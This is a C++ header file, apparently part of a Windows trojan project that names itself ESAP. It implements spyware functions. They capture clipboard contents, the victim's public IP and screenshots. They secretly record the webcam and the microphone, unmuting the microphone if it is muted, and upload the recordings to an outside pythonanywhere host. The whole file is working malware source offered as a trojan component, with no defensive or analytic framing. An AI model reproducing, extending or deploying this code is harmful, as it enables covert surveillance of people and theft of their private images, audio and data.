/*
 ___ ___   _   ___ 
| __/ __| /_\ | _ \
| _|\__ \/ _ \|  _/
|___|___/_/ \_\_|  

ESAP: The Extremely Sophisticated And Potent Trojan
<spy.hpp>
This header contains functions under the spy category.

*/

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <gdiplus.h>
#include <dshow.h>
#include <fstream>
#include <filesystem>
#include <mmdeviceapi.h>
#include <endpointvolume.h>

#include "request.hpp"
#include "file.hpp"
#include "string_functions.hpp"

#pragma once

std::string GrabClipboard() {
    if (!OpenClipboard(NULL)) {
        return "failed to open clipboard";
    }
    HANDLE hClipboard = GetClipboardData(CF_TEXT);
    char* pData = static_cast<char*>(GlobalLock(hClipboard));
    GlobalUnlock(hClipboard);
    CloseClipboard();
    return pData;
}

std::string GrabIP() {
    return GET_Request("http://ifconfig.me/ip");
}

CLSID GetEncoderClsid(const WCHAR* format) {
    UINT num = 0;
    UINT size = 0;
    Gdiplus::ImageCodecInfo* codecs = nullptr;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return CLSID_NULL;
    codecs = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (codecs == nullptr) return CLSID_NULL;
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(codecs[i].MimeType, format) == 0) {
            CLSID clsid;
            clsid = codecs[i].Clsid;
            free(codecs);
            return clsid;
        }
    }
    free(codecs);
    return CLSID_NULL;
}

std::string GrabScreenshot() {

    // Initialize GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    // Create a screen capture
    SetProcessDPIAware();
    int nWidth = GetSystemMetrics(SM_CXSCREEN);
    int nHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(GetDesktopWindow());
    int nLogicalScreenWidth = GetDeviceCaps(hdcScreen, HORZRES);
    int nLogicalScreenHeight = GetDeviceCaps(hdcScreen, VERTRES);
    int nDpiX = GetDeviceCaps(hdcScreen, LOGPIXELSX);
    int nDpiY = GetDeviceCaps(hdcScreen, LOGPIXELSY);
    int nScaleX = nDpiX / 96;
    int nScaleY = nDpiY / 96;
    int nCaptureWidth = nWidth * nScaleX;
    int nCaptureHeight = nHeight * nScaleY;
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, nCaptureWidth, nCaptureHeight);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, nCaptureWidth, nCaptureHeight, hdcScreen, 0, 0, SRCCOPY);

    // Save the screenshot to a memory stream
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsidEncoder = GetEncoderClsid(L"image/png");
    Gdiplus::EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = Gdiplus::EncoderQuality;
    encoderParams.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 100;
    encoderParams.Parameter[0].Value = &quality;

    IStream* pStream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
    bitmap.Save(pStream, &clsidEncoder, &encoderParams);

    // Get the size of the encoded data
    LARGE_INTEGER zeroOffset = { 0 };
    ULARGE_INTEGER streamSize;
    pStream->Seek(zeroOffset, STREAM_SEEK_END, &streamSize);
    pStream->Seek(zeroOffset, STREAM_SEEK_SET, nullptr);

    // Read the encoded data from the stream
    std::vector<BYTE> buffer(streamSize.LowPart);
    ULONG bytesRead = 0;
    pStream->Read(buffer.data(), buffer.size(), &bytesRead);

    // Convert the binary data to base64 string
    std::string base64;
    const std::string base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    size_t inputSz = buffer.size();
    size_t outputSz = 4 * ((inputSz + 2) / 3);

    base64.resize(outputSz);
    unsigned char* input = buffer.data();
    unsigned char* output = reinterpret_cast<unsigned char*>(&base64[0]);

    for (size_t i = 0, j = 0; i < inputSz;) {
        uint32_t octetA = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octetB = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;
        uint32_t octetC = i < inputSz ? static_cast<uint32_t>(input[i++]) : 0;

        uint32_t triple = (octetA << 16) + (octetB << 8) + octetC;

        output[j++] = base64Chars[(triple >> 18) & 0x3F];
        output[j++] = base64Chars[(triple >> 12) & 0x3F];
        output[j++] = base64Chars[(triple >> 6) & 0x3F];
        output[j++] = base64Chars[triple & 0x3F];
    }

    // Add padding characters if needed
    size_t padding = 3 - (inputSz % 3);
    if (padding != 3) base64.resize(outputSz - padding);

    // Clean up resources
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    DeleteObject(hBitmap);
    pStream->Release();

    return base64;
}

std::string GetWebcamImage() {

    // String to LPCOLESTR
    LPCOLESTR lpFileName = NULL;
    std::string file = RandomString(16);
    lpFileName = (LPCOLESTR) CoTaskMemAlloc((file.size() + 1) * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, file.c_str(), -1, (LPWSTR) lpFileName, (file.size() + 1));
    
    // Some declarations
    ICaptureGraphBuilder2* pBuild;
    IGraphBuilder* pGraph;
    IBaseFilter* pCap;
    IBaseFilter* pMux;
    IMoniker* pMoniker;
    IEnumMoniker* pEnum;
    ICreateDevEnum* pDevEnum;
    IMediaControl* pControl;
    
    // Initialize
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**) &pBuild);
    CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER, IID_IFilterGraph, (void**) &pGraph);
    pBuild->SetFiltergraph(pGraph);
    CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
    pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
    
    // Get webcam device
    while (pEnum->Next(1, &pMoniker, NULL) == S_OK) {

        IPropertyBag* pPropBag;
        pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
        VARIANT var;
        VariantInit(&var);

        pPropBag->Read(L"FriendlyName", &var, 0);
        VariantClear(&var);
        
        pPropBag->Release();
        pMoniker->Release();
    }
    pEnum->Reset();
    pEnum->Next(1, &pMoniker, NULL);

    // Bind filters
    pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**) &pCap);
    pGraph->AddFilter(pCap, L"Capture Filter");
    pGraph->QueryInterface(IID_IMediaControl, (void**) &pControl);
    pBuild->SetOutputFileName(&MEDIASUBTYPE_Avi, lpFileName, &pMux, NULL);
    pBuild->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, NULL, pMux);
    pControl->Run();
    Sleep(1000);

    // Clean up
    pControl->Stop();
    pBuild->Release();
    pGraph->Release();
    pCap->Release();
    pMux->Release();
    pMoniker->Release();
    pEnum->Release();
    pDevEnum->Release();
    pControl->Release();
    CoUninitialize();

    // Read and remove
    std::string data;
    std::ifstream pRead(file, std::ios::binary);
    ReadLong(pRead, data);
    pRead.close();
    std::filesystem::remove(file);

    std::string fileID = POST_RequestRaw("http://0x3af72.pythonanywhere.com/user_upload_temp/", data);
    return fileID;
}

std::string RecordAudio(int seconds) {
    
    // Unmute user
    HRESULT hr;
    IMMDeviceEnumerator* pEnum = NULL;
    IMMDevice* pDev = NULL;
    IAudioEndpointVolume* pAudioEndpointVol = NULL;
    CoInitialize(NULL);
    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**) &pEnum);
    pEnum->GetDefaultAudioEndpoint(eCapture, eConsole, &pDev);
    pDev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**) &pAudioEndpointVol);
    BOOL bMuted;
    pAudioEndpointVol->GetMute(&bMuted);
    if (bMuted) {
        pAudioEndpointVol->SetMute(FALSE, NULL);
    }
    pAudioEndpointVol->Release();
    pDev->Release();
    pEnum->Release();

    HWAVEIN hWaveIn;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 44100;
    wfx.nAvgBytesPerSec = 44100 * 2;
    wfx.nBlockAlign = 2;
    wfx.wBitsPerSample = 16;

    MMRESULT result = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

    char* buffer = new char[seconds * wfx.nAvgBytesPerSec];
    WAVEHDR wHeader;
    wHeader.lpData = buffer;
    wHeader.dwBufferLength = seconds * wfx.nAvgBytesPerSec;
    wHeader.dwFlags = 0;

    waveInPrepareHeader(hWaveIn, &wHeader, sizeof(WAVEHDR));
    waveInAddBuffer(hWaveIn, &wHeader, sizeof(WAVEHDR));
    waveInStart(hWaveIn);
    Sleep(seconds * 1000);
    waveInStop(hWaveIn);
    waveInUnprepareHeader(hWaveIn, &wHeader, sizeof(WAVEHDR));
    waveInClose(hWaveIn);

    std::string data;
    char header[44] = {0};
    strncpy(header, "RIFF", 4);
    *(int*) (header + 4) = 36 + wHeader.dwBufferLength;
    strncpy(header + 8, "WAVEfmt ", 8);
    *(int*) (header + 16) = 16; // Size of the fmt chunk
    *(short*) (header + 20) = 1; // Format (1 for PCM)
    *(short*)(header + 22) = 1; // Channels
    *(int*) (header + 24) = wfx.nSamplesPerSec; // Sample rate
    *(int*) (header + 28) = wfx.nSamplesPerSec * wfx.nBlockAlign; // Byte rate
    *(short*) (header + 32) = wfx.nBlockAlign; // Block align
    *(short*) (header + 34) = wfx.wBitsPerSample; // Bits per sample
    strncpy(header + 36, "data", 4);
    *(int*) (header + 40) = wHeader.dwBufferLength;
    CopyString(&data, header, sizeof(header));
    CopyString(&data, buffer, seconds * wfx.nAvgBytesPerSec);
    delete[] buffer;

    // Upload
    std::string fileID = POST_RequestRaw("http://0x3af72.pythonanywhere.com/user_upload_temp/", data);
    return fileID;
}